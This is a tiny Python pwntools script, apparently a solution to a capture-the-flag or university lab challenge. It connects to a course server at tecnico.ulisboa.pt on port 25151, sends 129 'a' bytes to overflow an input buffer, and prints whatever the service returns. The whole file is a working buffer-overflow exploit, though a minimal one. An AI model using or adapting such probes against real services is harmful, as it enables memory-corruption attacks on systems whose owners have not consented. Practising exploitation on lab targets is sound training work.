from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25151

s =  remote(SERVER, PORT, timeout=9999)

print(s.recvline())
s.sendline(b"a"*129)
print(s.recvall())